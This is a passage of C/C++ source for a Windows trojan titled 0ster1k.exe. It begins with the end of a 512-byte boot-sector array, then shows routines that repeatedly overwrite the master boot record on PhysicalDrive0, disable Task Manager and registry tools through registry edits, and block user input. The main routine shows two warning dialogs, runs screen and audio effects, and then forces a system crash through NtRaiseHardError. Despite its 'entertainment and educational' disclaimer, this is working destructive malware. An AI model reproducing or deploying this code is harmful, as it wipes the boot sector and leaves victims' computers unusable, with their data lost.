0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA


};


DWORD WINAPI OverwriteMBR(LPVOID lp) {
    while (1) {
		DWORD dwBytesWritten;
		HANDLE hDevice = CreateFileW(
			L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
			FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
			OPEN_EXISTING, 0, 0);

		WriteFile(hDevice, XOR_bin, 512, &dwBytesWritten, 0);
		CloseHandle(hDevice);        
        Sleep(1);	}
}

//--------------------------DISABLE COMMAND-------------------------------

DWORD WINAPI nopc(LPVOID lp) {
    system("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1");
    system("reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1");
    BlockInput(TRUE);
}


int main() {

    
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    typedef NTSTATUS (NTAPI *PFN_RtlAdjustPrivilege)(int, bool, bool, PBOOL);
            typedef NTSTATUS (NTAPI *PFN_NtRaiseHardError)(NTSTATUS, ULONG, ULONG, PVOID, ULONG, PULONG);
            
            PFN_RtlAdjustPrivilege pRtlAdjustPrivilege = (PFN_RtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
            PFN_NtRaiseHardError pNtRaiseHardError = (PFN_NtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
            
    PrepareAudio();
    if (MessageBoxW(NULL, L"This software is considered malware.\n By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it is highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis.\n\nAre you sure you want to run this?", L"0ster1k.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else {
        if (MessageBoxW(NULL, L"This Trojan has a lot of destructive potential. You will lose all of your data if you continue, and the creator will not be responsible for any of the damage caused. This is not meant to be malicious but simply for entertainment and educational purposes.\n\nAre you sure you want to continue? This is your final chance to stop this program from execution.", L"0ster1k.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else {
        InitializeSine();
        CreateThread(0, 0, nopc, 0, 0, 0);
        CreateThread(0, 0, OverwriteMBR, 0, 0, 0);
        StartCaps();
        Sleep(4000);
        StartMsgBox();
        Sleep(1000);
        HANDLE aud1 = CreateThread(NULL,0,AudioThreadSeq1,NULL,0,NULL);
        StartGDI2();
        Sleep(30000);
        StopGDI2();
        InvalidateRect(0, 0, 0);
        Sleep(100);
        HANDLE gdi2 = CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE)GDI2_2, NULL, 0, NULL);
        AudioSequence2();
        Sleep(30000);
        TerminateThread(gdi2, 0);
        InvalidateRect(0, 0, 0);
        Sleep(100);
        HANDLE gdi3 = CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE)sh, NULL, 0, NULL);
        HANDLE curs = CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE)cursorsh, NULL, 0, NULL);
        AudioSequence3();
        Sleep(30000);
        TerminateThread(gdi3, 0);
        TerminateThread(curs, 0);
        InvalidateRect(0, 0, 0);
        Sleep(100);
        HANDLE gdi4 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GDI4, NULL, 0, NULL);
        HANDLE text = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TextFluxCorrupt, NULL, 0, NULL);
        AudioSequence4();
        Sleep(30000);
        TerminateThread(gdi4, 0);
        TerminateThread(text, 0);
        InvalidateRect(0, 0, 0);
        Sleep(100);
        HANDLE gdi5 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GDI5, NULL, 0, NULL);
        AudioSequence5();
        Sleep(30000);
        TerminateThread(gdi5, 0);
        InvalidateRect(0, 0, 0);
        Sleep(100);
            
            if (pRtlAdjustPrivilege) pRtlAdjustPrivilege(19, true, false, (PBOOL)&t1);
            if (pNtRaiseHardError) pNtRaiseHardError(0xC0000145, 0, 0, NULL, 6, (PULONG)&t2);

        };
    };

    

    return 0;
}
